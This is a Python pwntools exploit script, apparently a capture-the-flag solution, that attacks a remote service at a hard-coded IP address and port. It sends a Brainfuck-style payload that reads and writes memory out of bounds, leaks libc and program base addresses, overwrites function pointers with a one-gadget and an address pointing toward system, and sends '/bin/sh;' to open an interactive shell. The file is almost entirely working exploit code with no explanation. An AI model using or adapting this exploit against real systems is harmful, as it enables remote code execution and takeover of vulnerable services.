from pwn import *


#p = process(["./main.py"])
p = remote("58.229.240.181",7777)
#p = remote("58.229.240.181",7777)

pay  = ">" * 16
pay += ",>" *9
pay += "<" * 24
pay += "+[+["
pay += "<" * 97 
pay += "[.>]"# read
pay += "<" * 14
pay += "[,>]"
pay += ">" * 10 
pay += "[.>]"#fprintf
pay += "<" * 6
pay += "[,>]"
pay += "]]"

p.sendlineafter(">>>",pay)


sleep(1)
p.sendline("/bin/sh;")

libc = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x110070 #read

print hex(libc)

p.send(p64(libc+0x4f322)[:6])

pie = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x7e6 

print hex(pie)

#fprintf -> allocate
#memset -> system

p.send(p64(pie+0x0000000000000935))

p.interactive()
